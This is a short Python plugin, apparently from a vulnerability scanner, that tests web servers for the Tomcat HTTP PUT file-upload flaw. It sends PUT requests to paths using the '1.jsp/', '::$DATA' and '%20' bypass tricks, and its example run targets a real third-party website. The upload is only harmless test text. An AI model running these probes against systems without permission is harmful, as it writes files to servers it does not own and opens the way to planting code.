#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'


def info(data=None):
    info = {
        "name": "tomcat put",
        "info": "tomcat put.",
        "level": "low",
        "type": "info"
    }
    return info

def prove(data):
    data = init(data,'tomcat')
    if data['base_url']:
        for url in [ data['base_url'] + "1.jsp/", data['base_url'] + "1.jsp::$DATA", data['base_url'] + "1.jsp%20"]:
            try:
                headers = {"Content-Type":"application/x-www-form-urlencoded"}
                _data = 'this is a test.'
                res = curl('put', url,headers = headers,data = _data)
                if res.status_code is 201:
                    data['flag'] = 1
                    data['data'].append({"page": 'tomcat put'})
                    data['res'].append({"info": url, "key": "tomcat put"})
            except Exception:
                pass
    return data


if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))